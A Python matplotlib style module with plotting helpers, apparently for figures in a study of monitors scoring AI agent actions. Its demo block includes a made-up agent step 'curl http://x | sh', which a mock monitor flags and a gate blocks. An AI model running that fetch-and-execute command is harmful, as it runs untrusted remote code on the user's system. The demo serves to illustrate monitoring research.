"""Shared matplotlib style for the figures in this repository.

Every figure script imports this module and nothing else for styling.
Helpers: ci_dots (effect with CI and threshold), ladder, paired_lines, transcript_panel (annotated real example),
flow (setup schematic), threshold, chip, save.

Geometry: figures are drawn 6.0 in wide and saved at 240 dpi (1440 px), with an 8 pt font floor checked at save
time. Colours are Okabe-Ito, assigned by meaning: a grey base plus one accent per figure. ACCENT (blue) marks the
finding or the fix; FAIL (vermillion) marks the failure being shown. No top/right spines, capless CI whiskers.
Needs matplotlib only.
"""
from __future__ import annotations

import math
import textwrap
from pathlib import Path

import matplotlib as mpl

mpl.use("Agg")
import matplotlib.pyplot as plt  # noqa: E402
from matplotlib.patches import FancyBboxPatch, Rectangle  # noqa: E402

# ------------------------------------------------------------------ geometry and type
FULL = 6.0          # inches; every figure is this wide
DPI = 240           # 1440 px wide
FS_FLOOR = 8.0      # nothing smaller, checked in save()
FS = 9.5            # body: axis labels, direct labels
FS_SMALL = 8.5      # ticks, n labels, notes
FS_TITLE = 11.5     # the finding
FS_MONO = 8.2       # transcript text
MONO_ADV = 0.602    # advance width of Menlo / DejaVu Sans Mono in em
SANS_ADV = 0.50     # mean advance of Helvetica / Arial / DejaVu Sans lower-case text, in em (slightly generous)

# ------------------------------------------------------------------ colours (Okabe-Ito, by meaning)
INK = "#1A1A1A"      # text, primary strokes
MUTED = "#5F5F5F"    # secondary text
BASE = "#8C8C8C"     # the grey base: every mark that is not the point of the figure
LIGHT = "#CFCFCF"    # recessive marks, per-item lines
RULE = "#E3E3E3"     # row rules, grid
PAPER = "#F6F6F4"    # panel fill for quoted material
ACCENT = "#0072B2"   # blue: the finding / the fix
ACCENT_TINT = "#DCEAF4"
FAIL = "#D55E00"     # vermillion: the failure being shown
FAIL_TINT = "#FBE6D8"
AMBER = "#E69F00"    # third category only when the design needs one (always directly labelled)
# The full Okabe-Ito (2008) set, for the rare figure that needs more than base + accent. Order = order of use.
OKABE_ITO = ["#0072B2", "#D55E00", "#E69F00", "#009E73", "#56B4E9", "#CC79A7", "#F0E442", "#000000"]
STATE = {            # verdict chips in transcript panels
    "miss": (FAIL, "white"), "catch": (ACCENT, "white"), "ok": ("white", MUTED), "neutral": (LIGHT, INK),
}


def apply() -> None:
    """Set rcParams. Call once at the top of a figure script."""
    mpl.rcParams.update({
        "font.family": "sans-serif",
        "font.sans-serif": ["Arial", "Helvetica", "DejaVu Sans"],
        "font.monospace": ["Menlo", "DejaVu Sans Mono"],
        "font.size": FS,
        "axes.titlesize": FS, "axes.titleweight": "bold", "axes.titlelocation": "left", "axes.titlepad": 6,
        "axes.labelsize": FS, "axes.labelcolor": INK, "axes.edgecolor": MUTED, "axes.linewidth": 0.7,
        "axes.spines.top": False, "axes.spines.right": False, "axes.grid": False,
        "xtick.labelsize": FS_SMALL, "ytick.labelsize": FS_SMALL, "xtick.color": MUTED, "ytick.color": MUTED,
        "xtick.labelcolor": INK, "ytick.labelcolor": INK,
        "xtick.major.width": 0.7, "ytick.major.width": 0.7, "xtick.major.size": 3, "ytick.major.size": 3,
        "axes.prop_cycle": mpl.cycler(color=OKABE_ITO),   # only reached if a script forgets to pick by meaning
        "text.parse_math": False,   # transcripts are full of $ signs
        "legend.frameon": False, "lines.linewidth": 1.4, "lines.markersize": 6,
        "figure.dpi": 120, "savefig.dpi": DPI, "figure.facecolor": "white", "savefig.facecolor": "white",
    })


# ------------------------------------------------------------------ small statistics and text helpers
def wilson(k: int, n: int, z: float = 1.959964) -> tuple[float, float]:
    """Wilson score 95% interval for k/n, as fractions."""
    if n == 0:
        return 0.0, 1.0
    p = k / n
    d = 1 + z * z / n
    c = p + z * z / (2 * n)
    h = z * math.sqrt(p * (1 - p) / n + z * z / (4 * n * n))
    return max(0.0, (c - h) / d), min(1.0, (c + h) / d)


def trim(s: str, n: int, where: str = "end") -> str:
    """Shorten an exact quote to about n characters, marking every cut with […]. Whitespace is collapsed."""
    s = " ".join(s.split())
    if len(s) <= n:
        return s
    if where == "middle":
        a = (n - 5) // 2
        return s[:a].rstrip() + " […] " + s[-a:].lstrip()
    if where == "start":
        return "[…] " + s[-(n - 4):].lstrip()
    return s[: n - 4].rstrip() + " […]"


def excerpt(s: str, needle: str, before: int = 60, after: int = 120) -> str:
    """Exact window around `needle` in s, with […] on each cut side. Raises if the needle is absent."""
    flat = " ".join(s.split())
    i = flat.index(" ".join(needle.split()))
    a, b = max(0, i - before), min(len(flat), i + len(needle) + after)
    return ("[…] " if a > 0 else "") + flat[a:b].strip() + (" […]" if b < len(flat) else "")


def wrap_mono(s: str, width_in: float, fs: float = FS_MONO) -> list[str]:
    n = max(10, int(width_in / (MONO_ADV * fs / 72)))
    out: list[str] = []
    for para in s.split("\n"):
        out += textwrap.wrap(para, n, break_long_words=True, break_on_hyphens=False) or [""]
    return out


def wrap_sans(s: str, width_in: float, fs: float = FS_SMALL) -> list[str]:
    n = max(10, int(width_in / (SANS_ADV * fs / 72)))
    out: list[str] = []
    for para in s.split("\n"):
        out += textwrap.wrap(para, n, break_long_words=False) or [""]
    return out


# ------------------------------------------------------------------ figure scaffolding
def figure(height: float, top: float = 0.62, **kw):
    """Figure FULL wide with `top` inches reserved for the finding title. Returns (fig, ax or axes)."""
    fig, ax = plt.subplots(figsize=(FULL, height), **kw)
    fig.subplots_adjust(top=1 - top / height)
    return fig, ax


def finding(fig, title: str, sub: str | None = None) -> None:
    """The title states the finding (bold, left); `sub` says what is plotted, in grey, on the next line."""
    h = fig.get_figheight()
    fig.text(0.012, 1 - 0.08 / h, title, ha="left", va="top", fontsize=FS_TITLE, fontweight="bold", color=INK,
             linespacing=1.15)
    if sub:
        nl = title.count("\n") + 1
        fig.text(0.012, 1 - (0.10 + 0.205 * nl) / h, sub, ha="left", va="top", fontsize=FS_SMALL, color=MUTED,
                 linespacing=1.2)


def threshold(ax, v: float, label: str, axis: str = "x", ls: str = "--", color: str = INK, pos: float = 0.98,
              side: str = "after", va: str = "top", **kw) -> None:
    """A pre-registered bar drawn as a labelled line (the label sits on the line, never in a legend)."""
    if axis == "x":
        ax.axvline(v, ls=ls, lw=1.0, color=color, zorder=1)
        ha = "left" if side == "after" else "right"
        ax.annotate(label, (v, pos), xycoords=("data", "axes fraction"), xytext=(4 if ha == "left" else -4, 0),
                    textcoords="offset points", ha=ha, va=va, fontsize=FS_SMALL, color=color, clip_on=False, **kw)
    else:
        ax.axhline(v, ls=ls, lw=1.0, color=color, zorder=1)
        va = "bottom" if side == "after" else "top"
        ax.annotate(label, (pos, v), xycoords=("axes fraction", "data"), xytext=(0, 3 if va == "bottom" else -3),
                    textcoords="offset points", ha="right", va=va, fontsize=FS_SMALL, color=color, **kw)


def ci_dots(ax, rows: list[dict], xlabel: str, xlim: tuple[float, float], scale: float = 100.0,
            label_fmt: str = "{est:.0f}%", groups: bool = True, group_x: float = 0.0) -> None:
    """Horizontal dot-and-interval chart with direct labels. The headline 'show it's real' form.

    rows (top to bottom): dict(label, est, lo, hi, n='11/59', hl=None|'accent'|'fail', group='Dev set' optional,
    side='left' optional). est/lo/hi are fractions (multiplied by `scale`). A row with est None draws a gap.
    """
    y = 0.0
    ys, labs = [], []
    last_group = None
    for r in rows:
        g = r.get("group")
        if groups and g and g != last_group:
            y -= 0.55 if last_group is not None else 0.0
            ax.text(group_x, y + 0.62, g, transform=ax.get_yaxis_transform(), ha="left", va="center",
                    fontsize=FS_SMALL, color=MUTED, fontweight="bold", zorder=6,
                    bbox=dict(fc="white", ec="none", pad=1.2))
            last_group = g
            y -= 0.25
        col = {"accent": ACCENT, "fail": FAIL, "amber": AMBER}.get(r.get("hl"), BASE)
        e, lo, hi = r["est"] * scale, r["lo"] * scale, r["hi"] * scale
        ax.plot([lo, hi], [y, y], color=col, lw=2.2, solid_capstyle="butt", zorder=2)
        ax.plot([e], [y], "o", ms=8, color=col, mec="white", mew=1.0, zorder=3)
        txt = label_fmt.format(est=e, lo=lo, hi=hi).replace("-", "\u2212")   # typographic minus
        if r.get("n"):
            txt += f"  ({r['n']})"
        left = r.get("side") == "left"      # put the label left of the interval when a threshold line sits to its right
        ax.annotate(txt, (lo if left else hi, y), xytext=(-6 if left else 6, 0), textcoords="offset points",
                    ha="right" if left else "left", va="center",
                    fontsize=FS_SMALL, color=INK if r.get("hl") else MUTED,
                    fontweight="bold" if r.get("hl") else "normal", zorder=6,
                    bbox=dict(fc="white", ec="none", pad=1.2))   # a threshold line never runs through a label
        ys.append(y)
        labs.append(r["label"])
        y -= 1.0
    ax.set_yticks(ys)
    ax.set_yticklabels(labs, fontsize=FS)
    for t, r in zip(ax.get_yticklabels(), rows):
        if r.get("hl"):
            t.set_fontweight("bold")
    ax.tick_params(axis="y", length=0)
    ax.spines["left"].set_visible(False)
    ax.set_ylim(y + 0.4, 0.95)
    ax.set_xlim(*xlim)
    ax.set_xlabel(xlabel)
    ax.spines["bottom"].set_bounds(max(xlim[0], 0), xlim[1])


def ladder(ax, x, y, lo, hi, labels, hl: int | None = None, connect: bool = True, scale: float = 100.0,
           label_dy: float = 9, hl_color: str = ACCENT) -> None:
    """A dose or model ladder: one dot with CI per rung, labelled at the dot, optional connecting line."""
    ys = [v * scale for v in y]
    if connect:
        ax.plot(x, ys, "-", color=LIGHT, lw=1.4, zorder=1)
    for i, (xi, yi, l, h, lab) in enumerate(zip(x, ys, lo, hi, labels)):
        col = hl_color if i == hl else BASE
        ax.plot([xi, xi], [l * scale, h * scale], color=col, lw=2.0, solid_capstyle="butt", zorder=2)
        ax.plot([xi], [yi], "o", ms=8, color=col, mec="white", mew=1.0, zorder=3)
        if lab:
            ax.annotate(lab, (xi, h * scale), xytext=(0, label_dy), textcoords="offset points", ha="center",
                        va="bottom", fontsize=FS_SMALL, color=INK if i == hl else MUTED,
                        fontweight="bold" if i == hl else "normal")


def paired_lines(ax, before, after, hl=None, xlabels=("Before", "After"), jitter: float = 0.0,
                 hl_color: str = ACCENT, lw: float = 1.0) -> None:
    """One line per item from its 'before' to its 'after' value. hl is a list of bools (highlighted items)."""
    import random
    rnd = random.Random(0)
    hl = hl or [False] * len(before)
    for b, a, h in sorted(zip(before, after, hl), key=lambda t: t[2]):
        j0, j1 = (rnd.uniform(-jitter, jitter), rnd.uniform(-jitter, jitter)) if jitter else (0, 0)
        ax.plot([0, 1], [b + j0, a + j1], "-", color=hl_color if h else LIGHT, lw=lw * (1.5 if h else 1),
                alpha=0.9 if h else 0.8, zorder=3 if h else 2, marker="o", ms=4,
                mfc=hl_color if h else LIGHT, mec="white", mew=0.5)
    ax.set_xticks([0, 1])
    ax.set_xticklabels(xlabels, fontsize=FS)
    ax.set_xlim(-0.25, 1.25)
    ax.tick_params(axis="x", length=0)


def chip(ax, x: float, y: float, text: str, state: str = "neutral", fs: float = FS_SMALL, w: float | None = None,
         ha: str = "left"):
    """A small rounded verdict chip (axes in inches)."""
    fc, tc = STATE[state]
    w = w or (len(text) * SANS_ADV * 1.12 * fs / 72 + 0.16)
    h = fs / 72 * 1.75
    x0 = x if ha == "left" else x - w
    ax.add_patch(FancyBboxPatch((x0, y - h / 2), w, h, boxstyle="round,pad=0,rounding_size=0.05",
                                fc=fc, ec=MUTED if state == "ok" else fc, lw=0.7, zorder=3))
    ax.text(x0 + w / 2, y - 0.004, text, ha="center", va="center", fontsize=fs, color=tc, fontweight="bold",
            zorder=4)
    return w


def transcript_panel(steps: list[dict], columns: list[str], title: str, sub: str | None = None,
                     text_frac: float = 0.50, tag_w: float = 0.62, footer: str | None = None,
                     text_head: str = "What the agent did (exact text)", lead: float = 0.0):
    """Annotated real example: one row per step, the exact text on the left, one verdict column per reader.

    steps: dict(tag='Step 5', text='exact quote, already trimmed with […]', hot=False,
                verdicts=[dict(chip='0', state='miss'|'catch'|'ok'|'neutral', quote='exact rationale excerpt')],
                mono=True)
    A step with collapsed=True draws a single grey summary line (text) with its chips and no quotes.
    Returns (fig, ax). Axes units are inches from the top-left, so callers can add annotations.
    lead > 0 reserves that many inches between the title block and the table for a setup schematic: draw it with
    flow(ax, nodes, y=ax.lead_y, h=lead - 0.12, x0=0.08, x1=FULL - 0.08).
    """
    title_h = 0.12 + 0.205 * (title.count("\n") + 1) + (0.165 * (sub.count("\n") + 1) if sub else 0) + 0.10
    pad, lh_m, lh_s = 0.095, FS_MONO / 72 * 1.36, FS_SMALL / 72 * 1.30
    margin = 0.08
    inner = FULL - 2 * margin
    text_w = inner * text_frac - tag_w
    col_w = inner * (1 - text_frac) / len(columns)
    chip_h = FS_SMALL / 72 * 1.75
    rows = []
    for s in steps:
        mono = s.get("mono", True)
        tl = (wrap_mono if mono else wrap_sans)(s["text"], text_w - 0.14, FS_MONO if mono else FS_SMALL)
        vl = [wrap_sans(v.get("quote", ""), col_w - 0.16) if v.get("quote") else [] for v in s["verdicts"]]
        h_text = len(tl) * (lh_m if mono else lh_s)
        h_v = max((chip_h + 0.05 + len(q) * lh_s) if q else chip_h for q in vl) if vl else 0
        rows.append((s, tl, vl, max(h_text, h_v) + 2 * pad))
    lead_y = title_h
    title_h += lead
    head_h = 0.30
    foot_h = (0.10 + 0.16 * len(wrap_sans(footer, inner))) if footer else 0.04
    H = title_h + head_h + sum(r[3] for r in rows) + foot_h
    fig = plt.figure(figsize=(FULL, H))
    ax = fig.add_axes([0, 0, 1, 1])
    ax.set_xlim(0, FULL)
    ax.set_ylim(H, 0)
    ax.axis("off")
    ax.lead_y = lead_y
    finding(fig, title, sub)
    y = title_h
    x_text = margin + tag_w
    x_cols = [margin + inner * text_frac + i * col_w for i in range(len(columns))]
    ax.text(x_text + 0.07, y + head_h / 2, text_head, fontsize=FS_SMALL, color=MUTED, va="center", fontweight="bold")
    for xc, c in zip(x_cols, columns):
        ax.text(xc + 0.08, y + head_h / 2, c, fontsize=FS_SMALL, color=MUTED, va="center", fontweight="bold")
    y += head_h
    ax.plot([margin, FULL - margin], [y, y], color=MUTED, lw=0.8)
    for s, tl, vl, h in rows:
        mono = s.get("mono", True)
        if s.get("hot"):
            ax.add_patch(Rectangle((margin, y), inner, h, fc=s.get("hot_fill", FAIL_TINT), ec="none", zorder=0))
        ax.text(margin + 0.05, y + pad + 0.02, s["tag"], fontsize=FS_SMALL, color=INK if s.get("hot") else MUTED,
                va="top", fontweight="bold")
        ax.text(x_text + 0.07, y + pad, "\n".join(tl), fontsize=FS_MONO if mono else FS_SMALL,
                family="monospace" if mono else "sans-serif", color=MUTED if s.get("collapsed") else INK, va="top",
                linespacing=1.18 if mono else 1.22, style="normal")
        for xc, v, q in zip(x_cols, s["verdicts"], vl):
            chip(ax, xc + 0.08, y + pad + chip_h / 2, v["chip"], v.get("state", "neutral"))
            if q:
                ax.text(xc + 0.08, y + pad + chip_h + 0.05, "\n".join(q), fontsize=FS_SMALL, color=INK, va="top",
                        linespacing=1.22)
        y += h
        ax.plot([margin, FULL - margin], [y, y], color=RULE, lw=0.7)
    for xc in x_cols:
        ax.plot([xc, xc], [title_h + 0.04, y], color=RULE, lw=0.7)
    if footer:
        ax.text(margin + 0.05, y + 0.08, "\n".join(wrap_sans(footer, inner)), fontsize=FS_SMALL, color=MUTED,
                va="top", linespacing=1.25)
    return fig, ax


def flow(ax, nodes: list[dict], y: float, h: float, x0: float, x1: float, gap: float = 0.22) -> list[tuple]:
    """A one-row setup schematic: boxes left to right joined by arrows (axes in inches, y down).

    nodes: dict(head='Agent', body='one line of what it does', hl=None|'accent'|'fail'). Returns the box rects.
    """
    n = len(nodes)
    w = (x1 - x0 - gap * (n - 1)) / n
    rects = []
    for i, nd in enumerate(nodes):
        x = x0 + i * (w + gap)
        ec = {"accent": ACCENT, "fail": FAIL}.get(nd.get("hl"), MUTED)
        fc = {"accent": ACCENT_TINT, "fail": FAIL_TINT}.get(nd.get("hl"), PAPER)
        ax.add_patch(FancyBboxPatch((x, y), w, h, boxstyle="round,pad=0,rounding_size=0.06", fc=fc, ec=ec,
                                    lw=1.0 if nd.get("hl") else 0.7))
        ax.text(x + w / 2, y + 0.09, nd["head"], ha="center", va="top", fontsize=FS_SMALL, fontweight="bold",
                color=INK)
        body = "\n".join(sum((wrap_sans(p, w - 0.12) for p in nd["body"].split("\n")), []))
        ax.text(x + w / 2, y + 0.30, body, ha="center", va="top", fontsize=FS_FLOOR + 0.2, color=INK,
                linespacing=1.25)
        if i < n - 1:
            ax.annotate("", (x + w + gap - 0.02, y + h / 2), (x + w + 0.02, y + h / 2),
                        arrowprops=dict(arrowstyle="-|>", color=MUTED, lw=1.0, shrinkA=0, shrinkB=0))
        rects.append((x, y, w, h))
    return rects


def save(fig, out_dir, name: str) -> Path:
    """Write <name>.png at 240 dpi after checking the font floor. No tight bbox: width stays exactly FULL."""
    fig.canvas.draw()
    small = sorted({(round(t.get_fontsize(), 1), t.get_text()[:30]) for t in fig.findobj(mpl.text.Text)
                    if t.get_text().strip() and t.get_visible() and t.get_fontsize() < FS_FLOOR - 1e-6})
    assert not small, f"{name}: text below {FS_FLOOR} pt: {small[:5]}"
    assert abs(fig.get_figwidth() - FULL) < 1e-6, f"{name}: width must be {FULL} in"
    r = fig.canvas.get_renderer()
    W, Hh = fig.get_figwidth() * fig.dpi, fig.get_figheight() * fig.dpi
    over = []
    for t in fig.findobj(mpl.text.Text):
        if t.get_text().strip() and t.get_visible():
            bb = t.get_window_extent(r)
            if bb.x1 > W + 1 or bb.x0 < -1 or bb.y0 < -1 or bb.y1 > Hh + 1:
                over.append((t.get_text()[:40], [round(v) for v in (bb.x0, bb.y0, bb.x1, bb.y1)], (round(W), round(Hh))))
    assert not over, f"{name}: text runs off the canvas: {over[:5]}"
    p = Path(out_dir) / f"{name}.png"
    fig.savefig(p, dpi=DPI)
    plt.close(fig)
    return p


if __name__ == "__main__":      # smoke test with made-up numbers: one figure per helper
    import sys
    out = Path(sys.argv[1] if len(sys.argv) > 1 else ".")
    apply()
    rows = [dict(label="Baseline", est=11 / 59, lo=wilson(11, 59)[0], hi=wilson(11, 59)[1], n="11/59"),
            dict(label="Fix", est=0.0, lo=0.0, hi=wilson(0, 57)[1], n="0/57", hl="accent")]
    fig, ax = figure(2.4, top=0.80)
    finding(fig, "DEMO: the fix removes the misses", "Made-up numbers. Dots with Wilson 95% intervals.")
    ci_dots(ax, rows, "Uncaught (%)", (-2, 60))
    threshold(ax, 10, "bar: 10%", pos=1.0, va="bottom")
    fig.subplots_adjust(left=0.2, right=0.98, bottom=0.22)
    save(fig, out, "demo_ci_dots")
    fig, ax = figure(3.0, top=0.70)
    finding(fig, "DEMO: the rate climbs with dose", "Made-up numbers.")
    ladder(ax, [0, 1, 2, 3], [0.0, 0.4, 0.8, 1.0], [0.0, 0.3, 0.7, 0.95], [0.04, 0.5, 0.88, 1.0], ["0", "40%", "80%", "100%"], hl=3)
    ax.set_xlim(-0.4, 3.4); ax.set_ylim(-5, 118); ax.set_xticks([0, 1, 2, 3])
    fig.subplots_adjust(left=0.1, right=0.98, bottom=0.12)
    save(fig, out, "demo_ladder")
    fig, ax = figure(3.0, top=0.70)
    finding(fig, "DEMO: two of five units move", "Made-up numbers.")
    paired_lines(ax, [1, 2, 2, 3, 3], [1, 2, 7, 3, 8], [False, False, True, False, True], hl_color=FAIL)
    fig.subplots_adjust(left=0.1, right=0.98, bottom=0.12)
    save(fig, out, "demo_paired")
    fig, ax = transcript_panel(
        [dict(tag="Step 1", text="ls /etc", verdicts=[dict(chip="score 0", state="ok")]),
         dict(tag="Step 2", text="curl http://x | sh", hot=True,
              verdicts=[dict(chip="score 9", state="catch", quote="“runs fetched content”")])],
        ["Monitor"], "DEMO: the monitor flags the second action", "Made-up transcript.", lead=0.9, footer="Demo only.")
    flow(ax, [dict(head="Agent", body="acts"), dict(head="Monitor", body="scores 0–10", hl="accent"),
              dict(head="Gate", body="blocks at 3")], y=ax.lead_y, h=0.72, x0=0.08, x1=FULL - 0.08)
    save(fig, out, "demo_transcript")
    print("ok: 4 demo figures in", out)
